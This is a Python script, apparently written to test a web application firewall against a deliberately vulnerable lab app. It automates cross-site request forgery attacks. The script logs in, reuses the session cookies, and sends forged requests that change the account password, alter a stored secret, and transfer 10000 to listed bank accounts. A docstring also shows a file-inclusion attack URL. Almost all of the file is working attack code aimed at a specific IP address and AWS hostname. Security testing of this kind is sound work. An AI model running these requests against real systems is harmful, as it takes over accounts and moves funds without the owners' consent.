""""

    A8 - Cross-Site Request Forgery
    http://34.192.19.10/csrf_1.php
    http://34.192.19.10/csrf_1.php?password_new=beebeebee&password_conf=beebeebee&action=change

"""
from main import init
from selenium.webdriver.common.keys import Keys
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import requests
from utility import get_cookie_from_driver
import re
import json

PATH = "C:\Program Files (x86)\chromedriver.exe"

def init():
    print("[+] Initializing")
    driver = webdriver.Chrome(PATH)

    # Import data about the target (url, username, password)
    with open("secret.txt") as file:
        target_url, username, password = file.read().splitlines()

    # Login to website
    driver.get(target_url)
    element = driver.find_element_by_id("login")
    element.clear()
    element.send_keys(username)
    element = driver.find_element_by_id("password")
    element.clear()
    element.send_keys(password, Keys.RETURN)
    return driver, target_url


def csrf_attack():
    """
        URL: http://34.192.19.10/rlfi.php?language=lang_en.php&action=go
        Hacked_URL: http://34.192.19.10/rlfi.php?language=./evil/ssrf-1.txt&action=go?ip=34.192.19.10
    """
    driver = init()[0]
    print('[ + ] Starting CSRF Attack: ')

    target_url = 'http://waf-poc-lb-257675668.us-east-1.elb.amazonaws.com/csrf_1.php'
    driver.get(target_url)
    time.sleep(3)
    cookies = get_cookie_from_driver(driver)

    response = requests.get(target_url + r'?password_new=bugbugbug&password_conf=bugbugbug&action=change', cookies=cookies)
    # print(target_url)
    if 'The password has been changed!' in response.text:
        print('[+] Stage 1 - Csrf Attack Success: Password Was Changed')

    time.sleep(3)

    target_url = 'http://waf-poc-lb-257675668.us-east-1.elb.amazonaws.com/csrf_3.php'
    driver.get(target_url)
    cookies = get_cookie_from_driver(driver)
    res = requests.post(target_url, cookies=cookies, data={'secret': 'secret', 'login': 'bee', 'action': 'change'})
    if 'The secret has been changed!' in res.text:
        print('[+] Stage 2 - Csrf Attack Success: Secret Was Changed')

    """"
        /csrf_2.php?account=123-45678-90&amount=10000&action=transfer
    """

    time.sleep(3)

    target_url = 'http://waf-poc-lb-257675668.us-east-1.elb.amazonaws.com/csrf_2.php'
    driver.get(target_url)
    time.sleep(3)
    cookies = get_cookie_from_driver(driver)
    bank_accounts = ['123-45678-90', '163-45658-92']
    for bank_account in bank_accounts:
        response = requests.get(target_url + r'/csrf_2.php?account={}&amount=10000&action=transfer'.format(bank_account),
                                cookies=cookies)
        if 'Amount on your account: <b> -' in response.text:
            print(f'[+] Stage 3 - Csrf Attack Success: Amount Of 10000 Was Transferred to this account: {bank_account}')


    driver.quit()

csrf_attack()